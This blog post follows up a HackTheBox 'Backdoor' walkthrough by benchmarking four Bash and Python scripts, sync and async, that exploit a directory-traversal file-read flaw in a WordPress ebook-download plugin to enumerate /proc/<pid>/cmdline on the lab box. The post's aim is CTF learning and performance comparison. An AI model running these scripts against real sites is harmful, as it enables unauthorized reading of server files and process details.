# Parallelizing in Bash and Python

[htb-backdoor](/tags#htb-backdoor ) [ctf](/tags#ctf )
[hackthebox](/tags#hackthebox ) [python](/tags#python ) [bash](/tags#bash )
[bash-async](/tags#bash-async ) [async](/tags#async ) [python-
async](/tags#python-async ) [youtube](/tags#youtube )
[programming](/tags#programming ) [bruteforce](/tags#bruteforce )  
  
Apr 24, 2022

  * [HTB Backdoor Walkthrough](/2022/04/23/htb-backdoor.html)
  * Parallelizing Bash and Python

![backdoor-scripts](https://0xdfimages.gitlab.io/img/backdoor-scripts-
cover.png)

To solve the Backdoor box from HackTheBox, I used a Bash script to loop over
2000 pids using a directory traversal / local file read vulnerability and pull
their command lines. I wanted to play with parallelizing that attack, both in
Bash and Python. I’ll share the results in this post / YouTube video.

## Building Four Scripts

[This video](https://www.youtube.com/watch?v=rn3R92y5Wlg) gives a quick
overview of the script I used in my [original solution](/2022/04/23/htb-
backdoor.html#bash-script), as well as shows re-writes for three additional
versions:

## Benchmarks

In the video, I tried each script for 2000 PIDs. After the video, I wanted to
look at how each scaled, especially the async ones. The results were
interesting:

| 2000 | 10000 | 20000 | 50000  
---|---|---|---|---  
Bash | 6:30 | - | - | 2:40:58  
Bash async | 0:05 | 0:45 | 1:24 | 5:24  
Python | 6:07 | - | - | 2:34:37  
Python async | 0:04 | 0:15 | 0:26 | 1:08  
  
While the async scripts were very similar for small brute forces (2,000), even
going up to 10,000 showed a significant gap, as the Python is much more
efficient.

Another thing I noticed is that while requests came back out of order for both
async attempts, the Bash ones were way more out of order.

My working theory is that Bash just chucks out all the requests and leaves the
OS to deal with it, where as Python is much better at scaling the requests and
sending more when there’s bandwidth to do so, and slowing down when things are
contested. But that’s just a theory.

## Scripts

### Bash Sync

    
    
    #!/bin/bash
    
    for i in $(seq 1 2001); do
    
        path="/proc/${i}/cmdline"
        skip_start=$(( 3 * ${#path} + 1))
        skip_end=32
    
        res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path} -o- | tr '\000' ' ')
        output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
        if [[ -n "$output" ]]; then
            echo "${i}: ${output}"
        fi
    
    done
    

### Bash Async

    
    
    #!/bin/bash
    
    check_pid() {
    
        path="/proc/${1}/cmdline"
        skip_start=$(( 3 * ${#path} + 1))
        skip_end=32
    
        res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path} -o- | tr '\000' ' ')
        output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
        if [[ -n "$output" ]]; then
            echo "${i}: ${output}"
        fi
    }
    
    for i in $(seq 1 2001); do
        check_pid "$i" &
        pid[${i}]=$!
    done
    
    for pid in ${pids[*]}; do
        wait $pid
    done
    

### Python Sync

    
    
    #!/usr/bin/env python3
    
    import requests
    
    for i in range(1, 2001):
    
        resp = requests.get(f"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{i}/cmdline")
        start = 3 * (14 + len(str(i)))
        end = -32
        cmdline = resp.text[start:end].replace('\x00', ' ')
        if cmdline:
            print(f"{i:5}: {cmdline}")
    

### Python Async

    
    
    #!/usr/bin/env python3
    
    import aiohttp
    import asyncio
    
    async def get_process(session, pid):
        url = f"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{pid}/cmdline"
        async with session.get(url) as resp:
            start = 3 * (14 + len(str(pid)))
            end = -32
            cmdline = (await resp.text())[start:end].replace('\x00', ' ')
            if cmdline:
                print(f"{pid:5}: {cmdline}")
    
    
    async def main():
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(1, 2001):
                tasks.append(asyncio.ensure_future(get_process(session, i)))
    
            await asyncio.gather(*tasks)
    
    asyncio.run(main())
    

[« HTB Backdoor Walkthrough](/2022/04/23/htb-backdoor.html)

[](/2022/04/24/parallelizing-in-bash-and-python.html)

